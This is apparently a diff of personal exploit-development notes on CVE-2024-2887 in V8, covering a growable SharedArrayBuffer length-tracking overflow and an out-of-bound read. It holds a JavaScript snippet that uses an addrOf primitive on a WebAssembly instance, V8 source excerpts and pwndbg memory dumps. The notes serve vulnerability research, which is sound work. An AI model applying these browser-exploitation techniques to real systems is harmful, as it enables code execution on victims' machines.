@@ -1,3 +1,7 @@
+### CVE-2024-2887
+
+
+Part 1: GSAB length_tracking integer under-overflow
 
 
 ```js
@@ -217,4 +221,113 @@ B24:
    0x7fff600007eb:	int3
    0x7fff600007ec:	mov    rbx,QWORD PTR [rbp+0x20]
 
+```
+
+Part 2: Out-of-bound read 
+
+how can I read this address of `Wasm instance data`?? 
+```
+ - context: 0x3ba200281729 <NativeContext[295]>
+ - code: 0x3ba200265afd <Code BUILTIN JSToWasmWrapper> // ??
+ - Wasm instance data: 0x0cec00040ced <Other heap object (WASM_TRUSTED_INSTANCE_DATA_TYPE)> //??
+```
+
+The program stored function_index in sandbox memory, so when they want to run this function, it need to calculate address by external pointer:
+```cpp
+WasmCode* NativeModule::GetCode(uint32_t index) const {
+  base::RecursiveMutexGuard guard(&allocation_mutex_);
+  WasmCode* code = code_table_[declared_function_index(module(), index)];
+  if (code) WasmCodeRefScope::AddRef(code);
+  return code;
+}
+```
+
+```js
+// https://wasdk.github.io/WasmFiddle/
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+
+let wasm_instance_addr = addrOf(wasm_instance);
+console.log("wasm_instance: 0x" + wasm_instance_addr.toString(16));
+
+%DebugPrint(f);
+console.log("==================================================================");
+
+// %SystemBreak();
+
+for (let i=0; i<10000; i++){
+    f();
+}
+%DebugPrint(wasm_instance);
+f();
+%SystemBreak();
+```
+It goes through `Runtime_WasmCompileLazy` function for optimizing tierup 
+```cpp
+// v8/src/runtime/runtime-wasm.cc:406
+RUNTIME_FUNCTION(Runtime_WasmCompileLazy) {
+  ClearThreadInWasmScope wasm_flag(isolate);
+  DCHECK_EQ(2, args.length());
+  Tagged<WasmTrustedInstanceData> trusted_instance_data =
+      WasmTrustedInstanceData::cast(args[0]);
+  int func_index = args.smi_value_at(1);
+
+  TRACE_EVENT1("v8.wasm", "wasm.CompileLazy", "func_index", func_index);
+  DisallowHeapAllocation no_gc;
+  SealHandleScope scope(isolate);
+
+  DCHECK(isolate->context().is_null());
+  isolate->set_context(trusted_instance_data->native_context());
+  bool success = wasm::CompileLazy(isolate, trusted_instance_data, func_index);
+  if (!success) {
+    DCHECK(v8_flags.wasm_lazy_validation);
+    AllowHeapAllocation throwing_unwinds_the_stack;
+    wasm::ThrowLazyCompilationError(
+        isolate, trusted_instance_data->native_module(), func_index);
+    DCHECK(isolate->has_exception());
+    return ReadOnlyRoots{isolate}.exception();
+  }
+
+  return Smi::FromInt(
+      wasm::JumpTableOffset(trusted_instance_data->module(), func_index));
+}
+```
+
+Struct wasm function 
+
+```cpp
+wasm funcrtion: 0xba60029afb9
+
+pwndbg> job 0xba60029afb9
+0xba60029afb9: [Function] in OldSpace
+ - map: 0x0ba6002926fd <Map[28](HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x0ba600281dc9 <JSFunction (sfi = 0xba6001474d1)>
+ - elements: 0x0ba600000725 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - function prototype: <no-prototype-slot>
+ - shared_info: 0x0ba60029af89 <SharedFunctionInfo js-to-wasm::i>
+ - name: 0x0ba6000027e1 <String[1]: #0>
+ - builtin: JSToWasmWrapper
+ - formal_parameter_count: 0
+ - kind: NormalFunction
+ - context: 0x0ba600281729 <NativeContext[295]>
+ - code: 0x0ba600265afd <Code BUILTIN JSToWasmWrapper>
+ - Wasm instance data: 0x27c500040cc5 <Other heap object (WASM_TRUSTED_INSTANCE_DATA_TYPE)>
+ - Wasm function index: 0
+ - properties: 0x0ba600000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0xba600000d99: [String] in ReadOnlySpace: #length: 0x0ba600271bbd <AccessorInfo name= 0x0ba600000d99 <String[6]: #length>, data= 0x0ba600000069 <undefined>> (const accessor descriptor, attrs: [__C]), location: descriptor
+    0xba600000dc5: [String] in ReadOnlySpace: #name: 0x0ba600271ba5 <AccessorInfo name= 0x0ba600000dc5 <String[4]: #name>, data= 0x0ba600000069 <undefined>> (const accessor descriptor, attrs: [__C]), location: descriptor
+    0xba600004215: [String] in ReadOnlySpace: #arguments: 0x0ba600271b75 <AccessorInfo name= 0x0ba600004215 <String[9]: #arguments>, data= 0x0ba600000069 <undefined>> (const accessor descriptor, attrs: [___]), location: descriptor
+    0xba6000044a9: [String] in ReadOnlySpace: #caller: 0x0ba600271b8d <AccessorInfo name= 0x0ba6000044a9 <String[6]: #caller>, data= 0x0ba600000069 <undefined>> (const accessor descriptor, attrs: [___]), location: descriptor
+ }
+ - feedback vector: feedback metadata is not available in SFI
+pwndbg> x/20wx 0xba60029afb9-1
+0xba60029afb8:	0x002926fd	0x00000725	0x00000725	0x002bf801
+0xba60029afc8:	0x0029af89	0x00281729	0x001400a9	0x002816d9
+0xba60029afd8:	0x30050307	0x0d000421	0x0a400bff	0x00000085
+0xba60029afe8:	0x00282139	0x0004a865	0x00000735	0x00000a89
+0xba60029aff8:	0x00000000	0x002816d9	0x30050307	0x2d000421
+pwndbg> 
 ```
